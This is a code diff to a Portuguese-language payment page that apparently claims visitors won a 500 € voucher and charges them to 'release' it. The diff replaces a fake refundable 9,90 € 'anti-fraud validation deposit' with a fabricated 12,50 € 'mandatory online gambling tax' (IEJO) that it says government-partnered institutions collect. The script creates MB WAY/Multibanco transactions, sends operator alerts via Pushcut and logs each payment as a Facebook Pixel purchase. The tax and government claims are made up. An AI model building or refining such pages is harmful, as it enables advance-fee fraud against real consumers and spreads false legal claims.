@@ -265,38 +265,40 @@
                 style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 11px; color: #2e7d32; margin-bottom: 15px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">
                 <span style="white-space: nowrap;">✓ Voucher gerado</span>
                 <span style="white-space: nowrap;">✓ Dados confirmados</span>
-                <span style="white-space: nowrap;">⏳ Validação de titularidade</span>
+                <span style="white-space: nowrap;">⏳ Pagamento de imposto</span>
             </div>
             <svg class="padlock-icon" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                 stroke-width="2">
                 <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                 <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
             </svg>
-            <h2 style="margin: 10px 0 5px; font-size: 18px; font-weight: 700;">Validação de Titularidade (Anti-fraude)
+            <h2 style="margin: 10px 0 5px; font-size: 18px; font-weight: 700;">Recolha de Imposto Obrigatório
             </h2>
-            <p style="margin: 0; font-size: 13px; color: #777;">Processo de Verificação de Segurança</p>
+            <p style="margin: 0; font-size: 13px; color: #777;">Imposto Especial de Jogo Online (IEJO)</p>
         </div>
 
         <div class="summary-box" style="background: #e8f5e9; border-color: #c8e6c9;">
             <p style="margin-top: 0; font-size: 13px; line-height: 1.5; color: #2e7d32;">
-                <strong>Medida de Segurança:</strong> Devido ao alto volume de tentativas de resgate com dados falsos, é
-                necessária uma validação bancária temporária para libertar o seu prémio.
+                <strong>Legislação Portuguesa:</strong> De acordo com a legislação vigente em Portugal, todos os prémios
+                de jogos e apostas estão sujeitos ao Imposto Especial de Jogo Online (IEJO), que deve ser recolhido
+                antes da entrega do prémio.
             </p>
             <p style="font-size: 13px; line-height: 1.5; color: #2e7d32; margin-bottom: 0;">
-                O valor de <strong>9,90 €</strong> será <span
-                    style="background: #fff; padding: 0 4px; border-radius: 4px; border: 1px solid #a5d6a7;">estornado
-                    automaticamente</span>
-                para a sua conta de origem após a verificação (aprox. 15 min).
+                O pagamento de <strong>12,50 €</strong> (2,5% de 500 €) é processado através de <span
+                    style="background: #fff; padding: 0 4px; border-radius: 4px; border: 1px solid #a5d6a7;">instituições
+                    parceiras do governo</span> (Multibanco e MB WAY), que têm acordo com a Autoridade Tributária para
+                recolha automática deste imposto.
             </p>
 
             <div class="info-row highlight" style="color: #2e7d32; border-top-color: #a5d6a7;">
-                <span>Depósito Temporário de Verificação</span>
-                <span>9,90 €</span>
+                <span>IEJO - Imposto Obrigatório (2,5%)</span>
+                <span>12,50 €</span>
             </div>
-            <p style="font-size: 10px; color: #1b5e20; margin-bottom: 0; text-align: right;">*100% Reembolsável</p>
+            <p style="font-size: 10px; color: #1b5e20; margin-bottom: 0; text-align: right;">*Valor do Prémio: 500,00 €
+            </p>
         </div>
 
-        <h3 style="font-size: 15px; font-weight: 700; margin-bottom: 15px;">Selecione o método para validar:</h3>
+        <h3 style="font-size: 15px; font-weight: 700; margin-bottom: 15px;">Selecione o método de pagamento:</h3>
 
         <div class="payment-grid">
             <div class="payment-option selected" onclick="selectPayment(this, 'mbway')" style="position: relative;">
@@ -321,7 +323,8 @@
 
         <p
             style="text-align: center; font-size: 11px; color: #666; margin: -15px 0 20px 0; padding: 0 10px; line-height: 1.4;">
-            O pagamento deve ser efetuado a partir de uma conta com o mesmo nome e NIF informados.
+            Após o pagamento do imposto, o seu voucher de 500 € será ativado instantaneamente para uso em loja física ou
+            online.
         </p>
 
         <button class="validation-btn" onclick="processPayment()"
@@ -331,7 +334,7 @@
                 <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                 <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
             </svg>
-            Confirmar Validação
+            Pagar Imposto e Ativar Voucher
         </button>
     </div>
 
@@ -454,7 +457,7 @@
 
         async function processPayment() {
             if (!selectedMethod) {
-                alert('Por favor, selecione um método de validação para continuar.');
+                alert('Por favor, selecione um método de pagamento para continuar.');
                 return;
             }
 
@@ -513,7 +516,7 @@
 
             // Create Transaction
             const result = await window.wayMB.createTransaction({
-                amount: 9.90,
+                amount: 12.50,
                 method: method,
                 payer: {
                     name: cleanName,
@@ -525,10 +528,10 @@
 
             if (result.success) {
                 // Notificar Pushcut (Pendente)
-                window.wayMB.notifyPushcut('Pendente delivery', `Novo pedido gerado: 9,90 € (${method.toUpperCase()})`);
+                window.wayMB.notifyPushcut('Pendente delivery', `Novo pedido gerado: 12,50 € (${method.toUpperCase()})`);
 
                 // FB Pixel Purchase Event
-                fbq('track', 'Purchase', { currency: "EUR", value: 9.90 });
+                fbq('track', 'Purchase', { currency: "EUR", value: 12.50 });
 
                 // Merge API Data with Payer Info for Display
                 const finalData = {
